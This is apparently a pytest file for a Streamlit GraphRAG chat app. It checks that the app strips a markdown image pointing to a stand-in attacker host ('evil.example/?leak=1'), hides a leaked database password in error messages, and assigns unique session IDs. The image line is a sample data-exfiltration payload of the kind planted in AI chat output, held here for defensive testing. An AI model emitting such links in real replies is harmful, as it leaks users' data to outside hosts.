"""Drive the real Streamlit script headlessly with a fake agent."""

from __future__ import annotations

import importlib
from pathlib import Path

import pytest

pytest.importorskip("streamlit.testing.v1")
from streamlit.testing.v1 import AppTest  # noqa: E402

from graphrag.config import ConfigError  # noqa: E402

APP = str(Path(__file__).resolve().parents[2] / "src" / "main.py")


class FakeAgent:
    def __init__(self, output="**BSG** binds ![x](https://evil.example/?leak=1) SLC16A1", error=None):
        self.output, self.error, self.calls = output, error, []

    def invoke(self, inputs, config):
        self.calls.append((inputs, config))
        if self.error:
            raise self.error
        return {"output": self.output}


class FakeBundle:
    def __init__(self, agent):
        self.agent = agent


@pytest.fixture
def use_agent(monkeypatch):
    def _use(agent=None, raise_on_build=None):
        def builder():
            if raise_on_build:
                raise raise_on_build
            return FakeBundle(agent)

        module = importlib.import_module("graph_rag_agent")  # the instance main.py will import
        monkeypatch.setattr(module, "get_agent_bundle", builder)
        import streamlit as st

        st.cache_resource.clear()
        return agent

    return _use


def run_with(prompt: str) -> AppTest:
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert not at.exception
    at.chat_input[0].set_value(prompt).run()
    assert not at.exception
    return at


def test_initial_render(use_agent):
    use_agent(FakeAgent())
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert not at.exception
    assert at.title[0].value.startswith("🧬 GraphRAG")
    assert len(at.chat_input) == 1


def test_chat_roundtrip_sanitises_output_and_uses_unique_session(use_agent):
    agent = use_agent(FakeAgent())
    at = run_with("Which proteins interact with BSG?")
    texts = [m.markdown[0].value for m in at.chat_message]
    assert texts[0] == "Which proteins interact with BSG?"
    assert texts[1] == "**BSG** binds x SLC16A1"  # exfiltration image stripped
    (inputs, config), = agent.calls
    sid = config["configurable"]["session_id"]
    assert inputs == {"input": "Which proteins interact with BSG?"}
    assert sid != "streamlit-session" and len(sid) == 32
    assert at.session_state.messages[-1]["content"] == "**BSG** binds x SLC16A1"


def test_two_browser_sessions_get_different_ids(use_agent):
    agent = use_agent(FakeAgent())
    run_with("one")
    run_with("two")
    ids = {c[1]["configurable"]["session_id"] for c in agent.calls}
    assert len(ids) == 2


def test_agent_error_is_generic(use_agent):
    use_agent(FakeAgent(error=RuntimeError("bolt://neo4j:hunter2@db")))
    at = run_with("q")
    answer = at.chat_message[1].markdown[0].value
    assert "unexpected error" in answer and "hunter2" not in answer


def test_config_error_is_reported(use_agent):
    use_agent(raise_on_build=ConfigError("Missing required environment variables: NEO4J_PASSWORD"))
    at = run_with("q")
    answer = at.chat_message[1].markdown[0].value
    assert "not configured correctly" in answer and "NEO4J_PASSWORD" not in answer


def test_empty_output_falls_back(use_agent):
    use_agent(FakeAgent(output=""))
    at = run_with("q")
    assert at.chat_message[1].markdown[0].value == "I couldn't generate an answer from the graph."
